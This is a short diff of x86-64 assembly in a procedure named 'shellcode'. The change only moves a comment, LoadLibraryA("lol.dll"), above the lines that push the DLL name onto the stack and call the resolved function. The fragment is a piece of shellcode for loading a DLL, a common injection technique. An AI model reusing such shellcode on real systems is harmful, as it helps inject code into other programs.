@@ -58,11 +58,11 @@ shellcode proc
     add rsp, 30h
     add rsp, 10h
     mov rsi, rax
+
+    ; LoadLibraryA("lol.dll")
     mov r12, 006c6c642e6c6f6ch
     push r12
     mov rcx, rsp
-
-    ; LoadLibraryA("lol.dll")
     sub rsp, 30h
     call rsi
     add rsp, 38h
